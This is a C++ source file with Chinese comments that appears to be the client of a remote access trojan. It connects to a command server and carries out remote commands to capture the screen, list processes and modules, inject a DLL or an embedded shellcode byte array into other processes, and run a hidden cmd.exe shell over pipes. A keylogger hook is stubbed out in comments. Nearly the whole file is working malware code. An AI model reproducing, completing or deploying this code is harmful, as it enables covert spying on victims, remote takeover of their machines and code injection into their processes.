#include "stdafx.h"
#include "work.h"
#include <thread>
#include <Psapi.h>
#include <tchar.h>

extern BOOL iskeyHook;
extern HANDLE myIn;
extern  HANDLE myOut;

extern SOCKET client;
DWORD dwLasttime;


unsigned char data[376] = {
	0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xEC, 0x60, 0x83, 0xEC, 0x04, 0x83, 0x24, 0x24, 0x00, 0x1E, 0x0F,
	0xA0, 0x1F, 0x33, 0xC0, 0x40, 0xD1, 0xE0, 0x40, 0xC1, 0xE0, 0x04, 0x8B, 0x00, 0x1F, 0x8B, 0x40,
	0x0C, 0x8B, 0x70, 0x1C, 0x33, 0xC9, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39,
	0x4F, 0x18, 0x75, 0xF2, 0x68, 0xB2, 0xF2, 0xE2, 0xF4, 0x68, 0x32, 0x74, 0x91, 0x0C, 0x68, 0x85,
	0xDF, 0xAF, 0xBB, 0x5B, 0x97, 0xE8, 0x9A, 0x00, 0x00, 0x00, 0x89, 0x45, 0xF4, 0x5B, 0xE8, 0x91,
	0x00, 0x00, 0x00, 0x89, 0x45, 0xF0, 0x5B, 0xE8, 0x88, 0x00, 0x00, 0x00, 0x89, 0x45, 0xEC, 0xE8,
	0x12, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x00, 0x01, 0x6B, 0x65, 0x72, 0x6E,
	0x65, 0x6C, 0x33, 0x32, 0x00, 0x01, 0x5E, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x6A, 0x0A, 0x38, 0x1E,
	0x63, 0x89, 0xD1, 0x4F, 0x5F, 0xB9, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x4E, 0x51, 0x56, 0xFF, 0x55,
	0xEC, 0x0B, 0xC0, 0x75, 0x04, 0x56, 0xFF, 0x55, 0xF0, 0x0B, 0xC0, 0x74, 0x3B, 0x8B, 0xD8, 0x56,
	0xE8, 0x97, 0x00, 0x00, 0x00, 0x8D, 0x74, 0x30, 0x02, 0x0F, 0xB6, 0x4E, 0xFF, 0xEB, 0x25, 0x51,
	0x53, 0x57, 0x56, 0x87, 0xFB, 0x8B, 0x1B, 0xE8, 0x28, 0x00, 0x00, 0x00, 0x5E, 0x5F, 0x5B, 0x0B,
	0xC0, 0x74, 0x0C, 0x8B, 0x4C, 0x24, 0x08, 0x89, 0x44, 0x8D, 0xF8, 0xFF, 0x44, 0x24, 0x08, 0x83,
	0xC7, 0x04, 0x59, 0x49, 0x0B, 0xC9, 0x75, 0xD7, 0x59, 0x49, 0x0B, 0xC9, 0x75, 0xAE, 0x83, 0xC4,
	0x04, 0x61, 0xEB, 0x6F, 0x8B, 0x47, 0x3C, 0x8B, 0x44, 0x38, 0x78, 0x03, 0xC7, 0x8B, 0x70, 0x20,
	0x03, 0xF7, 0x33, 0xC9, 0x56, 0x8B, 0x36, 0x03, 0xF7, 0x50, 0xE8, 0x2C, 0x00, 0x00, 0x00, 0x58,
	0x5E, 0x3B, 0xDA, 0x74, 0x09, 0x83, 0xC6, 0x04, 0x41, 0x3B, 0x48, 0x18, 0x72, 0xE6, 0x3B, 0xDA,
	0x75, 0x16, 0x8B, 0x70, 0x24, 0x03, 0xF7, 0x0F, 0xB7, 0x0C, 0x4E, 0x8B, 0x70, 0x1C, 0x03, 0xF7,
	0x8B, 0x34, 0x8E, 0x03, 0xF7, 0x96, 0xEB, 0x02, 0x33, 0xC0, 0xC3, 0xFC, 0x33, 0xC0, 0x99, 0xAC,
	0x85, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x07, 0x03, 0xD0, 0xEB, 0xF4, 0xC3, 0x57, 0x8B, 0x7C, 0x24,
	0x08, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0xF2, 0xAE, 0xF7, 0xD1, 0x49, 0x8B, 0xC1, 0x5F,
	0xC2, 0x04, 0x00, 0x6A, 0x00, 0xE8, 0x03, 0x00, 0x00, 0x00, 0x68, 0x69, 0x00, 0xE8, 0x0C, 0x00,
	0x00, 0x00, 0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x00, 0x6A, 0x00,
	0xFF, 0x55, 0xF8, 0x6A, 0x00, 0xFF, 0x55, 0xFC
};

//发送头
BOOL sendData(SOCKET s, LPCVOID data, DWORD len) {


	if (s == INVALID_SOCKET)
		return FALSE;
	int countlen = 0;//发送的总长
	while (countlen < len) {
		int n = send(s, ((char*)data) + countlen, len-countlen, 0);//单次发送的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
};


BOOL sendData(SOCKET s, DWORD code, LPCVOID data, DWORD len) {
	PackHeader PH;
	PH.type = code;
	PH.length = len;
	if (s == INVALID_SOCKET || data == NULL || len == 0)
		return FALSE;
	int countlen = 0;//发送的总长
	while (countlen < len) {
		int n = send(s, ((char*)data) + countlen, len - countlen, 0);//单次发送的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
}





BOOL recvData(SOCKET s, LPCVOID data, DWORD len) {

	if (s == INVALID_SOCKET || data == NULL || len == 0)
		return FALSE;

	int countlen = 0;//接受的总长

	while (countlen < len) {
		int n = recv(s, ((char*)data) + countlen, len - countlen, 0);//单次接受的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
}



VOID GetScreen(SOCKET s) {
	HDC deskDC;
	HDC deskcompDC;
	HBITMAP deskcompBitemap;
	//先获取screen的width和height
	int hWidth = GetSystemMetrics(SM_CXSCREEN);
	int hHeight = GetSystemMetrics(SM_CYSCREEN);
	//定义位图大小 宽*高*4
	int size = hWidth * hHeight * 4;
	//定义存放的缓冲区
	char* buf = new char[size+8];
	memcpy(buf, &hWidth, sizeof(hWidth));
	memcpy(buf + sizeof(hWidth), &hHeight, sizeof(hHeight));

	try {
		

		//获取桌面源DC
		 deskDC = GetDC(GetDesktopWindow());
		 if (!deskDC)
			 throw deskDC;
		//创建兼容的内存DC
		 deskcompDC = CreateCompatibleDC(deskDC);
		 if (!deskcompDC)
			 throw deskcompDC;
		//创建兼容位图
		 deskcompBitemap = CreateCompatibleBitmap(deskDC, hWidth, hHeight);
		 if (!deskcompBitemap)
			 throw deskcompBitemap;
		//关联内存DC和位图
		SelectObject(deskcompDC, deskcompBitemap);
		//把源桌面DC拷贝内存DC
		BitBlt(deskcompDC, 0, 0, hWidth, hHeight, deskDC, 0, 0, SRCCOPY);
	
	
		//获取位图数据
		GetBitmapBits(deskcompBitemap, size, buf+8);
	}
	catch (...) {
		if (!deskDC)
			ReleaseDC(GetDesktopWindow(), deskDC);
		if (!deskcompDC)
			DeleteDC(deskcompDC);
		if (!deskcompBitemap)
			DeleteObject(deskcompBitemap);
		return;
	}
	//如果获取成功就会来这里

	//在这里向服务器发送数据
	PackHeader PH;
	PH.type = CTOS_SCREENT;
	PH.length = size + 8;
	sendData(s,&PH, sizeof(PH));//先发送头
	sendData(s, PH.type, buf, PH.length);
	//发送完毕释放DC等数据
	ReleaseDC(GetDesktopWindow(), deskDC);
	DeleteDC(deskcompDC);
	DeleteObject(deskcompBitemap);
	delete[] buf;


}

SOCKET InitSock() {
	WSAData wsaData;
	WSAStartup(0x0202, &wsaData);
	SOCKET Client = socket(AF_INET, SOCK_STREAM, 0);
	if (Client == INVALID_SOCKET)
		return INVALID_SOCKET;

	sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8848);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	int res = connect(Client, (sockaddr*)&addr, sizeof(sockaddr_in));
	if (res == INVALID_SOCKET)
		return INVALID_SOCKET;

	return Client;

}


BOOL InitPipe(HANDLE* myin, HANDLE* myout, DWORD* prcessid ) {
	//创建于cmd通信的管道
	//本程序出口与cmd入口的管道
	HANDLE myOut;
	HANDLE cmdIn;
	//cmd的出口与本程序入口的管道
	HANDLE cmdOut;
	HANDLE myIn;

	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	//创建本程序出口与cmd入口的管道
	int res = CreatePipe(&cmdIn, &myOut, &sa, 0);
	if (!res)
		return FALSE;

	res = CreatePipe(&myIn, &cmdOut, &sa, 0);
	if (!res)
		return FALSE;

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = cmdIn;
	si.hStdOutput = cmdOut;
	res = CreateProcess(_T("C:\\Windows\\System32\\cmd.exe"),//进程路径
		NULL,//命令行参数
		NULL,//进程继承
		NULL,//线程继承
		TRUE,//是否继承句柄
		CREATE_NO_WINDOW,//创建模式
		NULL,//环境变量
		NULL,//工作路径
		&si,//启动信息
		&pi);//进程信息
	if (!res)
		return FALSE;
	*myin = myIn;
	*myout = myOut;
	*prcessid = pi.dwProcessId;
	
	return TRUE;

}
VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
	DWORD Len = strlen(lpStr);
	int i = 0;
	PackHeader PH;
	//PH.type = eCmd;
	char wbuf[256] = {0};
	memcpy(wbuf, lpStr, Len);
	wbuf[Len] = '\n';
	wbuf[Len + 1] = '\0';

	DWORD numofwrite = 0;
	DWORD numofread = 0;

	
	while (1) {
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
		PH.length = strlen(rbuf)+1;
		//PH.type = eCmd;
		
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}

	WriteFile(myOut, wbuf, strlen(wbuf), &numofwrite, NULL);

	while (1) {
		
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		if (!i) {
			Sleep(300);
		} else
			Sleep(50);
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
	//	PH.type = eCmd;
		PH.length = strlen(rbuf) + 1;
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}
	PH.type = -1;
	PH.length = -1;

	send(s, (char*)&PH, sizeof(PH), 0);
}
//获取模块信息

BOOL GetModuleinfo(SOCKET s,DWORD processid) {
	PackHeader PH;
	MODULEENTRY32 md32;
	md32.dwSize = sizeof(MODULEENTRY32);
	PH.type = CTOS_MODULE;
	PH.length = sizeof(MODULEENTRY32);
	
	//获取模块信息
	HANDLE hSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processid);
	BOOL bMore = Module32First(hSnashot, &md32);
	while (bMore) {
		//发送数据
		sendData(s, &PH, sizeof(PackHeader));
		sendData(s, &md32, sizeof(MODULEENTRY32));
		bMore = Module32Next(hSnashot, &md32);
	}
	CloseHandle(hSnashot);
	return 1;
}
//获取进程列表
BOOL Getprocesslist(SOCKET s) {

	PackHeader PH;
	PH.type = CTOS_PROCESS;
	
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hsnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hsnashot == INVALID_HANDLE_VALUE)
		return FALSE;
	BOOL bMore =  Process32First(hsnashot, &pe32);
	while (bMore) {
	//在这里发送服务器
		
		TCHAR lpFilename[256] = { 0 };
		HANDLE h_Process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);
		if (h_Process) {
			int res = GetModuleFileNameEx(h_Process, NULL, lpFilename, sizeof(lpFilename));
			if (res) {
				PH.length = sizeof(PROCESSENTRY32)+(_tcslen(lpFilename) + 1) * 2;
				sendData(s, &PH, sizeof(PackHeader));
				sendData(s, &pe32, sizeof(PROCESSENTRY32));
				int i = _tcslen(lpFilename) + 1;
				sendData(s, lpFilename, (_tcslen(lpFilename) + 1)*2);
			} else {
				PH.length = sizeof(PROCESSENTRY32);
				sendData(s, &PH, sizeof(PackHeader));
				sendData(s, &pe32, sizeof(PROCESSENTRY32));
			} 
		} 
		
		bMore = Process32Next(hsnashot, &pe32);

	}
	CloseHandle(hsnashot);
	

}

BOOL inJectDLL(DWORD dwProcessId,LPCTSTR lpDllPath) {
	MODULEENTRY32 md32;
	md32.dwSize = sizeof(MODULEENTRY32);
	DWORD dwnumofwrite = 0;
	//打开进程获取进程句柄
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == INVALID_HANDLE_VALUE)
		return FALSE;
	//申请DLL路径大小的内存
	LPVOID lpAddress = VirtualAlloc(NULL, _tcslen(lpDllPath) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpAddress)
		return FALSE;
	//写路径
	BOOL res = WriteProcessMemory(hProcess, lpAddress, lpDllPath, _tcslen(lpDllPath)*2, &dwnumofwrite);
	if (!res)
		return FALSE;
	//获取偏移
	HMODULE hmoudule = GetModuleHandleW(_T("kernel32.dll"));
	if (hmoudule == INVALID_HANDLE_VALUE)
		return TRUE;
	DWORD offset = ((DWORD)LoadLibraryW) - ((DWORD)hmoudule);
	//获取远程keinel的地址

	HANDLE hProceHND = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
	if (hProceHND == INVALID_HANDLE_VALUE)
		return FALSE;
	BOOL bMore = Module32First(hProceHND, &md32);
	while (bMore) {
		if (!_tcscmp(md32.szModule, _T("kernel32.dll")))
			break;
			

		bMore = Module32Next(hProceHND, &md32);
	}

	if (!bMore)
		return FALSE;
	//获取到kernel32.dll的首地址
	LPVOID lpLoadlibrary = (LPVOID)((DWORD)md32.hModule + offset);
	CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpLoadlibrary, lpAddress, NULL, NULL);

	



}

BOOL inJectshellcode(DWORD dwProcessId) {
	
	DWORD numofwrite = 0;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == INVALID_HANDLE_VALUE)
		return FALSE;
	LPVOID lpAddress = VirtualAlloc(NULL, sizeof(data)+1, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!lpAddress)
		return FALSE;
	BOOL res = WriteProcessMemory(hProcess, lpAddress, data, sizeof(data), &numofwrite);
	numofwrite;
	if (!res)
		return FALSE;

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAddress, 0, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE)
		return FALSE;

	return TRUE;

}

DWORD _stdcall proceThread(LPVOID p) {
	while (TRUE) {
		SOCKET s = (SOCKET)p;
		char Databuf[256] = { 0 };
		PackHeader PH;
		BOOL res = recvData(s, &PH, sizeof(PackHeader));
		char* data;
		if (!res)
			break;
		if (PH.length > 0) {
			//说明服务器有数据发过来在这里接受
			//recvData(s, Databuf, PH.length);
			 data = new char[PH.length];
			 memset(data, 0, PH.length);
		}
		dwLasttime = GetTickCount();
		switch (PH.type)
		{
		case STOC_PROCESS:{
							  //获取进程名
							  Getprocesslist(s);
		}break;
		case STOC_SCREENT:{
							  //获取桌面数据然后在函数里发送给服务器
							  GetScreen(s);

		}break;
		case STOC_HEARBEAT:{
							  // OutputDebugStringA("收到心跳恢复包");
							   dwLasttime = GetTickCount();
		}break;
		case STOC_MODULE:{
							 //发送模块的信息
							 recvData(s, data, sizeof(DWORD));
							 GetModuleinfo(s, *(LPDWORD)data);
		}break;
		case STOC_SHELLCODE:{
								//收取注入shellcode的进程ID
								recvData(s, data, sizeof(DWORD));
								inJectshellcode(*(LPDWORD)data);

		}break;
		case STOC_INJECTDLL:{
								recvData(s, data, PH.length);
								DWORD dwProcess = *(LPDWORD)data;
								LPCTSTR path = (LPCTSTR)((DWORD)data + sizeof(DWORD));
								inJectDLL(dwProcess, path);
		}break;
		/*case eCmd:{
					  iskeyHook = FALSE;
				   recv(s,(char*) command, sizeof(command)-1, 0);
				  
				   cmd(myIn, myOut, s, command);
		}break;
		case eKeyboard:{//键盘监控程序
						   iskeyHook = TRUE;
		}break;*/
		default:break;

		}
		if (PH.length > 0) {
			//说明服务器有数据发过来在这里接受
			
			delete[] data;
		}
		PH = {0};

	}
	return 0;

}


DWORD _stdcall connectFun(LPVOID p) {

	//创建一个事件
	//HANDLE even = CreateEvent(NULL, FALSE, FALSE, NULL);
	BOOL isconnect = FALSE;
	
	PackHeader PH;
	PH.type = CTOS_HEARBEAT;
	PH.length = 0;
	

		dwLasttime = GetTickCount();//保存时间

		std::thread sth([&]() {
			while (TRUE) {
				if (GetTickCount() - dwLasttime > HEARBEAT_TIME) {//到时间发送心跳包了
					BOOL res = sendData(client, &PH, sizeof(PackHeader));
					//OutputDebugStringA("发送心跳包");
					if (!res) {
					//	OutputDebugStringA("客户端掉线");
						//SetEvent(even);
						isconnect = TRUE;
						closesocket(client);
					}
					

				}
/*

				if ((GetTickCount() - dwLasttime) > HEARBEAT_TIME * 2) {
					//掉线了
					OutputDebugStringA("客户端掉线");
					SetEvent(even);
					closesocket(client);

				}*/
				Sleep(HEARBEAT_TIME);
			}
			

		});
		//脱离主线程的联系
		sth.detach();
		CreateThread(NULL, NULL, proceThread, (LPVOID)client, 0, 0);
	
		while (1) {
			
			if (isconnect) {
				//WaitForSingleObject(even, INFINITE);

				
				//OutputDebugStringA("重新连接");
				client = InitSock();
				if (client != INVALID_SOCKET)
				//	OutputDebugStringA("连接成功");
				dwLasttime = GetTickCount();
				isconnect = FALSE;
				CreateThread(NULL, NULL, proceThread, (LPVOID)client, 0, 0);
			}
			Sleep(HEARBEAT_TIME);
		}
	

}